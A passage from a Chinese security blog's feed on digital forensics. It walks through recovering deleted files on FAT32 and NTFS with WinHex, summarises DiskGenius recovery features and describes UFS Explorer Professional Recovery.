title="image.png"><p>修改第一位</p><p>分别将FAT1和FAT2的信息进行修改，从10号开始填补簇链到15个簇被填满，其中最后一个以FFFFFF0F结尾。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365648903-f827c808-032c-4db3-acce-d68e74ae11eb-20210424192611380.png" class="" title="image.png"><p>fat1（恢复）</p><p>保存后发现文件已恢复，内容完整。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365657274-201e51f7-de06-4723-aa35-8e2a06c26f85-20210424192611814.png" class="" title="image.png"><p>恢复成功</p><p>至此，FAT32文件恢复已完成。</p><h4 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h4><h5 id="NTFS数据恢复过程"><a href="#NTFS数据恢复过程" class="headerlink" title="NTFS数据恢复过程"></a>NTFS数据恢复过程</h5><p>同样，先在NTFS格式的E盘创建一个文本文档，再使用shift+delete进行删除。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365666720-04b7b4f5-aa35-4cf3-956a-761e671008ca-20210424192611801.png" class="" title="image.png"><p>创建文件.png</p><p>打开$MFT元文件。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365670799-e5f7f77d-a033-479e-b36f-e3d14b891374-20210424192613977.png" class="" title="image.png"><p>查找文件名test的位置（MFT文件名是unicode形式），找到对应的MFT。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365676342-f2cf8e52-1f2d-4510-b711-fadb64e7296a-20210424192612894.png" class="" title="image.png"><p>查找.png</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365681290-a6bf53a8-6028-4926-9806-9c23177b905c-20210424192613048.png" class="" title="image.png"><p>文件MFT.png</p><p>16H为00H说明该文件被删除，系统根据这个标志来决定建立新文件时是否覆盖这个MFT而创建自己的MFT。</p><p>再向下找到80H处，往后八个字节为01，则找到相对80H处30H的EE0D00即0DEE为文件大小，经计算为3.48kb基本符合。再向后偏移10H，31表示往后一个字节01H为簇数1，再后三个字节638002即28063H为首簇号，换算成十进制为163939。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365687725-31189727-ebd7-4816-9e3d-72a7e230d623-20210424192612284.png" class="" title="image.png"><p>文件属性.png</p><p>选中$MFT元文件，根据刚才得到的簇号转到文件数据存储扇区。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365693211-6377284e-7eca-4c02-95e3-50f2936b2e69-20210424192613018.png" class="" title="image.png"><p>转到扇区1.png</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365697411-35b6b18a-183a-4572-bf0f-e51b7e1494ef-20210424192614549.png" class="" title="image.png"><p>转到扇区2.png</p><p>将起始位置设为起始点，根据文件大小0DEE算出数据结尾处转到当前位置偏移，再设为终止点，即可选中所有数据。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365703854-b8d2122a-0387-454c-a6a2-cad3b73f2d7b-20210424192613644.png" class="" title="image.png"><p>选中数据区域.png</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365709145-deb6be3c-0d4c-4bfd-8fbd-9b14e37705fa-20210424192613107.png" class="" title="image.png"><p>转到终止点.png</p><p>选中数据选择复制导入到新文件，我们选择恢复到E盘（其实最好不应选择恢复到原文件盘，但因无其他数据，经试验此次无影响），即可完成文件恢复。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365714604-f096360e-1758-4c60-9ec1-22363058d4a5-20210424192613949.png" class="" title="image.png"><p>生成文件.png</p><p>使用记事本打开发现数据已恢复无误。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/1617365720167-6d038493-b061-4e05-9c9f-9fedd289992d-20210424192613348.png" class="" title="image.png"><p>恢复成功.png</p><p>至此，NTFS文件删除后恢复已完成。</p><p>参考资料：</p><p>(NTFS部分）</p><p><a href="http://www.webkaka.com/info/archives/system/2015/05/282147/">http://www.webkaka.com/info/archives/system/2015/05/282147/</a></p><p><a href="http://www.webkaka.com/info/archives/system/2015/05/282148/">http://www.webkaka.com/info/archives/system/2015/05/282148/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/f14a41e8cfbe&quot;&gt;https://www.jianshu.com/p/f14a41e8cfbe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官网 &lt;a href=&quot;http://www.x-ways.com/inde</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/</id>
    <published>2021-04-24T11:24:52.946Z</published>
    <updated>2021-04-24T11:28:52.112Z</updated>
    
    <content type="html"><![CDATA[<p>官网 <a href="https://www.diskgenius.cn/">https://www.diskgenius.cn/</a></p><p>DiskGenius有免费版、标准版与专业版三个版本状态（<a href="https://www.diskgenius.cn/pro/details.php">功能对比</a>）。三个版本共用同一个发行包，不必分别下载。</p><p>下载后，即可立即使用免费版DiskGenius；注册后，可自动升级为标准版或专业版。</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://www.diskgenius.cn/download.php">https://www.diskgenius.cn/download.php</a></p><h1 id="软件教程"><a href="#软件教程" class="headerlink" title="软件教程"></a>软件教程</h1><p><a href="https://www.diskgenius.cn/help/">https://www.diskgenius.cn/help/</a></p><p>帮助手册离线版[<a href="https://www.diskgenius.cn/help/DiskGenius%20%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.pdf]">https://www.diskgenius.cn/help/DiskGenius%20%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.pdf]</a>(<a href="https://www.diskgenius.cn/help/DiskGenius">https://www.diskgenius.cn/help/DiskGenius</a> 用户使用手册.pdf)</p><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="使用DiskGenius恢复数据"><a href="#使用DiskGenius恢复数据" class="headerlink" title="使用DiskGenius恢复数据"></a>使用DiskGenius恢复数据</h2><p>当计算机内的文件被有意无意的删除、或遭到病毒破坏、分区被格式化后，若想恢复这些已丢 失的文件，均可使用本功能。实际上，操作系统在删除文件时，只是将被删除文件打上了“删除标 记”，并将文件数据占用的磁盘空间标记为“空闲”。文件数据并没有被清除，还静静地“躺”在 磁盘上。只要删除文件后没有建立新的文件，操作系统没有写入新的数据，这些被删除的文件数据 就不会被破坏，就有机会通过一定的技术手段将它们“抢救”出来。 </p><p>格式化操作执行时并不会考虑磁盘上原来的数据内容，也不会先删除旧文件。不同的文件系统 类型，格式化的具体操作内容也不同。对于 FAT32、FAT16、FAT12 等文件系统，格式化时会清除 文件分配表(简称 FAT，固定位于分区的开始部分，含有文件数据的定位信息)及根目录。文件数据 一般不会被清除。对于 NTFS 文件系统，格式化时新写入的数据没有固定位置要求，但正常情况下 每次格式化时的写入位置不会变化。因此旧文件数据大多不会被覆盖，仍存在大量残余信息供我们 找到丢失的文件。</p><p>本功能就是通过分析残留在磁盘上的文件的部分信息来重新找到文件数据及文件夹的层次结 构，从而达到恢复文件数据的目的。 </p><p>对于整个分区已经丢失的情况，请首先参阅“搜索已丢失分区(重建分区表)”功能，先搜索到 丢失的分区。然后可以在保存分区表后、或在不保存分区表的情况下再利用“文件恢复”功能恢复 分区内的文件。 </p><p>分区被破坏的表现有：在“我的电脑”中打开分区时系统提示“未格式化”“需要格式化”， 分区属性显示为“RAW”，打开分区后看不到任何文件。遇到这些情况时，都可以通过“误格式化 后的文件恢复”功能来恢复文件。</p><p>本功能支持 NTFS、exFAT、FAT32、FAT16、FAT12、EXT4、EXT3、EXT2 等文件系统类型 的磁盘分区、支持使用这些文件系统格式的硬盘、移动硬盘、RAID 卷、U 盘、存储卡(如数码相机 中的 SD 卡、XD 卡等等)、虚拟磁盘。 </p><p>为保护正在恢复的分区不被再次破坏，本软件在搜索分区内的文件时，会采用只读模式，不会 向分区写入任何数据。 </p><p>要开始恢复文件，首先选择丢失文件所在的分区，然后点击工具栏“恢复文件”按钮，或点击 主菜单“工具”中的“已删除或格式化后的文件恢复”菜单项，以打开文件恢复对话框。如下图：</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749592550-8610aa31-591a-4bf1-b2c3-600692a97931.png" class="" title="image.png"><p>由于格式化后的文件恢复与文件正常删除后的恢复过程不同，我们将这两种情况分别处理。下 面是具体的操作方法：</p><h3 id="一、恢复已删除的文件："><a href="#一、恢复已删除的文件：" class="headerlink" title="一、恢复已删除的文件："></a>一、恢复已删除的文件：</h3><p>如果确定文件是删除的，在恢复文件对话框中选择“恢复已删除的文件”。 如果在文件被删除之后，文件所在的分区有写入操作，则最好同时勾选“额外扫描已知文件类 型”选项，并点击“选择文件类型”按钮设置要恢复的文件类型。勾选这个选项后，软件会扫描分 区中的所有空闲空间，如果发现了要搜索类型的文件，软件会将这些类型的文件在“所有类型”文 件夹中列出。这样，如果在删除之前的正常目录中找不到删除过的文件，就可以根据文件扩展名在 “所有类型”里面找一下。</p><p>很多情况下，即使刚刚删除的文件，通过普通的删除恢复功能也无法找回。这是因为已删除文 件的重要信息被操作系统或用户的误操作破坏了。这种导致二次破坏的操作往往是在不经意间发生 的。比如在误删除了一些照片文件后，马上打开“资源管理器”在各个目录中找寻刚刚删除的文件 并使用了Windows的缩略图预览功能。恰恰是这样的操作就足矣破坏已删除文件的大量重要信息。 因为缩略图预览功能会在文件夹下面生成缩略图缓存文件。类似的不经意操作有很多。在这种情况 下，必须通过“扫描文件类型”的方式来恢复文件。虽然通过这种方式找到的文件，文件名是用序 号来命名的，但仍然可以通过预览功能、或者复制出来后打开确认。特别是对于恢复照片及 Office 文档时非常有效。 </p><p>由于扫描文件类型时速度较慢(需要扫描所有空闲扇区)，建议先不使用这个选项，用普通的方 式搜索一次。如果找不到要恢复的文件，再用这种方式重新扫描。 </p><p>点击“开始”按钮以开始搜索过程：</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749629848-630e75bb-ceba-4337-9872-a66b995cd528.png" class="" title="image.png"><p>搜索完成后，恢复文件对话框自动关闭。程序主界面将显示搜索到的文件，每个丢失的文件或 文件夹前面都有一个复选框，左侧的文件夹层次图中的条目也加上了复选框。见下图。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749649914-853ed660-4a77-4f75-b23e-537dd2cce3e5.png" class="" title="image.png"><p>对于不能确定归属的文件及文件夹，程序将它们统一放到一个叫做“孤立的文件”的内存文件 夹中。如果在原位置找不到要恢复的文件，可以尝试在“孤立的文件”文件夹中查找文件。恢复后 查找文件时不要忘了这个文件夹，很可能要恢复的重要文件就在这里。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749664186-a1efd7a9-d5e6-438b-b664-91504ad2a2ea.png" class="" title="image.png"><p>在恢复文件的状态下，文件列表中的“属性”栏将给已删除文件增加两个标记“D”和“X”。 “D”表示这是一个已删除的文件。“X”表示这个文件的数据可能已被部分或全部覆盖，文件数据 完全恢复的可能性较小。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749679527-87dccee2-e1f5-48f2-a373-afd441acfe81.png" class="" title="image.png"><p>在扫描完成的界面中，会出现“红色删除标志”与“绿色删除标志”。“红色删除标志”表示 文件或文件夹是被删除的，“绿色删除标志”表示文件夹中含有删除的文件或文件夹。如下图所示：</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749690328-7a6ea683-c724-4303-9b09-478877907c5c.png" class="" title="image.png"><p>为方便用户识别搜索到的文件，软件默认情况下也会显示未被删除的正常文件，只是正常文件 没有复选框，不可选择。</p><p>要恢复搜索到的文件，请通过复选框选择要恢复的文件。然后在文件列表中点击鼠标右键，或 打开“文件”主菜单，选择“复制到指定文件夹”菜单项。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749710825-87c8e0c6-c485-43a1-be37-9f2ea91b0aba.png" class="" title="image.png"><p>接下来选择存放恢复后文件的文件夹，点击“选择文件夹”按钮，程序会将当前选择的文件复 制到指定的文件夹中。为防止复制操作对正在恢复的分区造成二次破坏，本软件不允许将文件恢复 到原分区。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749724808-977e36c7-67a7-4c7a-918d-c1024c57fdcb.png" class="" title="image.png"><p>点击“完成”按钮，关闭文件复制对话框，程序自动清除已复制的文件的选择状态。以准备选 择其它文件。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749735329-2ff57089-25d3-4987-9022-c1eedc43b6b0.png" class="" title="image.png"><p>当所有要恢复的文件都复制出来后。可以通过“分区 - 重新加载当前分区”菜单项释放当前 分区在内存中的暂存数据，并从磁盘加载当前分区，显示分区的当前状态。</p><h3 id="二、完整恢复："><a href="#二、完整恢复：" class="headerlink" title="二、完整恢复："></a>二、完整恢复：</h3><p>适用于分区被格式化，或是分区被破坏打不开的情况，如：在“我的电脑”中打开分区时系统 提示“未格式化”、“需要格式化”，分区属性显示变为“RAW”，打开分区后看不到任何文件。 这时软件会默认选择选择“完整恢复”，而“恢复已删除的文件”默认为不勾选的状态。用“完整 恢复”的同时建议勾选“额外扫描已知文件类型”选项，并点击“选择文件类型”按钮设置要恢复 的文件类。勾选这个选项后，软件会在正常扫描的同时根据特定文件类型的文件头数据恢复指定类 型的文件。恢复完成后，将所有找到的文件类型，按类型扩展名划分目录，整理到一个单独的虚拟 “分区”中。除搜索速度稍慢外，不影响正常恢复，但能恢复更多的文件。</p><h3 id="三、恢复已删除的文件-与-完整恢复-同时选择："><a href="#三、恢复已删除的文件-与-完整恢复-同时选择：" class="headerlink" title="三、恢复已删除的文件 与 完整恢复 同时选择："></a>三、恢复已删除的文件 与 完整恢复 同时选择：</h3><p>打开“恢复文件”功能默认情况下是两个功能都选择，如果自己不确定文件丢失的情况下，建 议两个都勾选。这个功能是先扫描删除的文件再扫描全盘。扫描的同时最好勾选“额外扫描已知文 件类型”选项，并点击“选择文件类型”按钮设置要恢复的文件类型。勾选这个选项后，软件会在 正常扫描的同时，根据特定文件类型的文件头数据恢复指定类型的文件。恢复完成后，将所有找到 的文件类型，按类型扩展名划分目录，整理到一个单独的虚拟“分区”中。除搜索速度稍慢外，不 影响正常恢复，但能恢复更多的文。 </p><p>点击“开始”按钮以开始搜索过程。该恢复方式的搜索时间较长。接下来的操作步骤和“恢复 误删除文件”过程相同。参照上面的方法选择与复制文件即可。</p><h2 id="保存文件恢复进度"><a href="#保存文件恢复进度" class="headerlink" title="保存文件恢复进度"></a>保存文件恢复进度</h2><p>在恢复数据的时候，如果丢失数据的分区或硬盘空间很大，通常会需要比较长的时间进行扫描。</p><p>用户可以将扫描进度进行保存，这样如果软件被关闭了，可以加载之前的恢复进度，无需再从头开</p><p>始扫描，节约时间。</p><p>本软件在搜索文件的时候会自动保存进度，但是，如果本软件位于扫描范围内，软件将不会</p><p>自动保存扫描进度，以免产生不必要的写入操作。遇到这种情况，用户可以手动保存恢复进度。</p><h3 id="一、保存文件恢复进度"><a href="#一、保存文件恢复进度" class="headerlink" title="一、保存文件恢复进度"></a>一、保存文件恢复进度</h3><ol><li>扫描结束后，点击“工具”菜单，然后选择“保存文件恢复进度”选项。</li></ol><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749884969-bcd09b13-5b47-4c81-8e32-c9eb07503d20.png" class="" title="image.png"><ol><li>选择保存路径并为文件命名，然后点击“保存”按钮。<br>提醒：扫描进度文件的扩展名是“.dgrp”，软件自动保存的进度文件是存放在软件所在的文<br>件中。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749908292-56155ab4-958a-427d-8224-c2cf41b54d26.png" class="" title="image.png"></li></ol><h3 id="二、加载恢复进度"><a href="#二、加载恢复进度" class="headerlink" title="二、加载恢复进度"></a>二、加载恢复进度</h3><ol><li>选中之前扫描并保存过恢复进度的分区，然后点击“恢复文件”按钮。</li><li>在恢复文件窗口上点击“加载扫描进度”按钮。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749928929-84fc583a-a869-48a7-8d1f-3092a7dedf8f.png" class="" title="image.png"></li><li>选中自己保存的扫描进度文件，然后点击“打开”按钮。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749951009-6726f057-ad81-4054-9311-0f91d71a2443.png" class="" title="image.png"></li><li>点击文件恢复窗口上的“开始”按钮，软件开始加载之前的扫描进度。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616749969289-909a96df-c6d2-4c9a-bbbe-914ff7650a96.png" class="" title="image.png"></li></ol><h2 id="按指定文件类型恢复文件"><a href="#按指定文件类型恢复文件" class="headerlink" title="按指定文件类型恢复文件"></a>按指定文件类型恢复文件</h2><p>有时，分区内数据毁坏的比较严重，按普通的恢复模式，效果不好。这时可以尝试按指定文件 类型恢复文件。 </p><p>DiskGenius 按指定文件类型恢复文件的功能非常强大，支持的文件类型有 100 多种，恢复的 效果好，使用起来也非常方便。 </p><p>DiskGenius 有两种按指定文件类型恢复文件的方式，在误删除或误格式化后的文件恢复恢复 模式中，DiskGenius 已经提供了附加的按文件类型搜索文件的功能，并在搜索结果中，显示了按文 件类型搜索出来的文件列表；此外，DiskGenius 专门提供了一种直接输出文件的按类型恢复文件的 模式，这种恢复模式，比前一种，更加灵活。比如可以搜索空闲区域，可以指定文件数据的对齐位 置等。</p><ol><li>使用按指定文件类型恢复模式恢复文件，从主菜单中选择 “工具” - “恢复指定类型的文件”</li></ol><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616750094659-902306e0-c847-45b9-b9db-ac3969dc852d.png" class="" title="image.png"><ol><li>在接下来的弹出窗口中，用户可以对恢复模式的一些参数进行设置。比如可以只恢复空闲簇，适用于误删除、或分区被部分覆盖等情况。</li></ol><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616750132631-3d13bcda-20b3-454a-ae26-a7746b48aa0b.png" class="" title="image.png"><ol><li>点击”选择文件类型”按钮，可以设置本次搜索的特定文件类型，默认是搜索所有的文件类型，可以设置为只搜索一部分文件类型。<img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/1616750158256-bd9614b8-1b5c-405d-96d6-377b5b793ce1.png" class="" title="image.png"></li><li>搜索完毕后，被搜索到的文件按文件类型分类，每种文件类型有一个或多个以该文件类型 名命名的文件夹，每个文件夹中的文件数最大为 1000。 用这种模式搜索出来的文件，其文件名会丢失，DiskGenius 是按顺序号为这些文件命名的， 要想判断这里面有没有您需要的文件，您可以通过文件大小等方面，结合文件预览功能，逐一打开 预览来判断。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;官网 &lt;a href=&quot;https://www.diskgenius.cn/&quot;&gt;https://www.diskgenius.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DiskGenius有免费版、标准版与专业版三个版本状态（&lt;a href=&quot;https://www.diskgeniu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/"/>
    <id>https://xtpeeps.cn/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/</id>
    <published>2021-04-24T11:23:14.318Z</published>
    <updated>2021-04-24T11:35:13.578Z</updated>
    
    <content type="html"><![CDATA[<p>官网 <a href="https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php">https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php</a></p><p>国内常见的支持E01镜像文件访问的软件主要有GetData Mount Image Pro、AccessData FTK Imager和OSFMount等。我们使用GetData Mount Image Pro将镜像文件映射为本地磁盘驱动，然后再将镜像文件中的操作系统加载到虚拟机上运行。</p><p>推荐使用ufs explorer professional recovery.( <a href="https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php">https://www.ufsexplorer.com/ufs-explorer-professional-recovery.php</a>) 实测好用。</p><img src="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/1615787742995-5e729fab-10a6-4914-bf2f-7f0ecb9cf9c3.png" class="" title="image.png"><h2 id="自述"><a href="#自述" class="headerlink" title="自述"></a>自述</h2><p>UFS Explorer Professional Recovery是一款专家级软件工具，旨在解决高度复杂的数据恢复挑战。</p><p>除了线性电子媒体，如硬盘、u盘和存储卡，该程序处理基于RAID的各种布局的存储，包括标准的、嵌套的、自定义的和特定的配置- Drobo BeyondRAID、Synology Hybrid RAID、Btrfs-RAID和ZFS RAID-z。集成的解密算法可以打开用BitLocker、LUKS、FileVault 2和APFS加密的卷，而不必在操作系统中解锁它们。软件还支持许多文件系统用于Windows, Linux, macOS BSD,提供直接访问其内容,以及各种存储技术,包括Windows动态磁盘,存储空间和重复数据删除,苹果软件RAID,核心存储和时间机器,Linux mdadm和自动精简配置LVM。此外，该应用程序允许使用各种虚拟化系统，如VMware、Hyper-V、VirtualBox、QEMU、XEN和许多格式的磁盘映像。</p><p>此外，UFS Explorer专业恢复功能扩展了有效处理存储设备的可能性，特别是那些显示出某些硬件问题的设备。该软件提供了一个先进的程序，可以打开带有使用参数的存储，并有机会用处理后的数据保存稀疏图像文件。与DeepSpar磁盘成像仪连接的驱动器可以通过局域网进行操作，并由软件控制，而不需要任何第三方解决方案。在嵌入式成像功能的帮助下，还可以创建磁盘的完整或部分映像，该功能具有用于磁盘读取和删除损坏块的各种设置。具有缺陷区域的映射可以在成像过程中生成，或通过将已使用/空闲文件系统空间转换为掩模，并在恢复过程中使用。文件和存储的原始内容可以在软件中通过广泛的辅助工具直接分析和编辑。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>增强的存储读取机制</p><p>创建磁盘映像的高级可能性</p><p>支持多种存储技术</p><p>内置磁盘解密技术</p><p>支持不同RAID类型的自动重构</p><p>带有嵌入式脚本处理程序的可调RAID生成器</p><p>综合工具包的工作与缺陷存储</p><p>有效分析和编辑二进制数据的多种手段</p><h2 id="支持的系统环境"><a href="#支持的系统环境" class="headerlink" title="支持的系统环境"></a>支持的系统环境</h2><p>软件可以安装在Windows, Apple macOS and Linux</p><h3 id="操作系统："><a href="#操作系统：" class="headerlink" title="操作系统："></a>操作系统：</h3><p><strong>Microsoft Windows ®:</strong> Windows ® XP with Service Pack 3 and later</p><p><strong>Apple macOS:</strong> version 10.9 and above</p><p><strong>Linux:</strong> Debian Linux 6.0 (or compatible) and above</p><h3 id="支持的cpu架构"><a href="#支持的cpu架构" class="headerlink" title="支持的cpu架构"></a>支持的cpu架构</h3><p><strong>Intel Architecture,</strong> 32-bit (IA-32, x86)</p><p><strong>AMD64</strong> (x86-64)</p><h3 id="支持的文件系统"><a href="#支持的文件系统" class="headerlink" title="支持的文件系统"></a>支持的文件系统</h3><ul><li><strong>内容访问和数据恢复</strong></li></ul><p><strong>Data access and advanced recovery:</strong></p><p>Windows: NTFS, FAT, FAT32, exFAT, ReFS/ReFS3;</p><p>macOS: HFS+, APFS;</p><p>Linux: Ext2, Ext3, Ext4, XFS, Extended format 